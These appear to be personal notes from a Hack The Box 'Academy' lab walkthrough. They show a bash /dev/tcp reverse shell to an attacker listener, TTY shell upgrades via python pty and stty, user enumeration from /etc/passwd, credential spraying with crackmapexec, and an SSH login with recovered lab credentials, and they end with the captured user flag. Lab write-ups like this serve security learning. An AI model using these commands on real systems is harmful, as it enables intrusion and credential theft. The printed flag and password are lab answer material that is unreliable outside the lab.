
![[Pasted image 20230810054359.png]]

Can't use TTY to get the full shell in metasploit.

So in order to  get the full terminal will run the bash script and listen to port 9001
bash -c 'bash -i >& /dev/tcp/10.10.16.58/9001 0>&1'

![[Pasted image 20230810064058.png]]

I had a hard time converting the dump shell to full control shell had to type
stty raw -echo ; fg

Finally got a terminal with full control
![[Pasted image 20230810064337.png]]

# Upgrade a Dumb Reverse Shell into a Fully Functional Terminal
https://www.youtube.com/watch?v=vOEO_6xfsdo

When you're in a reverse shell, you'd be placed into a dumb shell on www-data (assuming you popped the shell from a web exploit).

This dumb shell will stop working if you use Ctrl + C.

Hence you have to upgrade it.

Usually there's python installed on the box, which allows you to use python3 -c "__import__('pty').spawn('/bin/bash')" or similar.

Afterwards, use Ctrl + Z  followed by stty -raw echo, then fg on bash, or stty -raw echo;fg on zsh.

Finally, type reset.

Input your TERM var (usually xterm-256color).

Then you should have an interactive shell that allows Ctrl + C and history to function properly

Got a password of Database from academy folder when we used command ls -la
![[Pasted image 20230810081957.png]]

![[Pasted image 20230810082020.png]]

Got user list but it needs user privilege to read the file
![[Pasted image 20230810073359.png]]

cat /etc/passwd | grep sh$ | awk -F: '{print $1}'
![[Pasted image 20230810073920.png]]

We made 2 files 
pw for password 
user for user 
and run the crackmapexec  on it
![[Pasted image 20230810080728.png]]

Will try to make a SSH connection
UserId: cry0l1t3
Password: mySup3rP4s5w0rd!!

Command: ssh  cry0l1t3@academy.htb

![[Pasted image 20230810082539.png]]

Last login: Wed Aug 12 21:58:45 2020 from 10.10.14.2
$ ls
user.txt
$ cat user.txt  
aeab6248d9ff01acab2058ddcbe5932e

On occasions you get reverse shell but not tty shell, you can get it via the command-  
_python -c ‘import pty; pty.spawn(“/bin/bash”)’_  
  
Upgrading to fully interactive TTY shell (working arrow keys and CTRL-C won’t kill the reverse shell session). After python -c ‘import pty; pty.spawn(“/bin/bash”)’ , hit CTRL-z (this will background the nc session). then on kali machine type “stty raw -echo “ and enter. again, type “fg” and enter. (input cannot be seen after hitting stty command so simply type fg and enter).  
_This will now give fully interactive TTY shell as if you were logged in via SSH._

![[Pasted image 20230810082819.png]]

